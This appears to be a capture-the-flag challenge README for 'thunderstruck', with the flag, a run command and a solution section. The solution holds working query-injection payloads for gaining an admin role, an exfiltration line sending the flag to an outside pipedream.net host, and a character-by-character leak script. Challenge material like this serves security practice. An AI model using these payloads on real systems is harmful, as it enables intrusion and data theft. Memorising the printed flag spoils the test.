# thunderstruck

## Description

```
Description here please
```

### Flag

`dam{sq1_4nd_3xcel_ar3_w3ak_gr4phs_3re_fun}`

## Checklist for Author

* [ ] Challenge compiles
* [ ] Dockerfile has been updated
* [ ] `base-container/run_chal.sh` has been updated
* [ ] `build-artifacts` has been updated to include any files needed from the remote service (i.e. libc)
    * If there are no files needed from the container, please **delete** this file to speed up CI/CD runs
* [ ] There is at least one test exploit/script in the `tests` directory
* [ ] Update `.dockerignore` with files that won't necessitate a container rebuild

## Info

_Author, put whatever you want here_

```
$ CHAL_CORTEX_VIEW=862bffd74c0bfe5d8986548010d395b5 CHAL_CORTEX_URL=loop CHAL_SECRET_KEY=asdfasdfasdfasdf python thunderstruck.py
```

### solution

to get admin:

```
{$a=a return($a.rjust(128,a))} auth:creds:user=asdf [+#role.admin] /////////////////////////////////////////////////////////////
```

to get the flag, there are at least 3 solutions:

* make a new meta:event node and put the flag in :summary
```
{$a=a return($a.rjust(128,a))} it:dev:str^=dam $f=$node.value() {spin | [meta:event=* :summary=$f +#ingest]} ///////////////////
```

* lib.inet.http.get it out to somewhere (this one is too long but the concept is there)
```
{$a=a return($a.rjust(128,a))} it:dev:str^=dam | $lib.inet.http.get("https://en6bw77peg0iw.x.pipedream.net", headers=({'x':$node.value()})
```

* leak it one char at a time
```py
flag = "dam{"
while not flag.endswith("}"):
    for c in FLAG_CHARSET:
        candidate = flag + c
        query = r"{$a=a return($a.rjust(128,a))} it:dev:str^='" + candidate + "' "
        query = query.ljust(128, "/")
        r = sess.post(BASE_URL + "/lookup", data={"query": query}, allow_redirects=True)
        if "sus indicator!" in r.text:
            flag += c
            print(f"found: {c}\t{flag}")
            break
```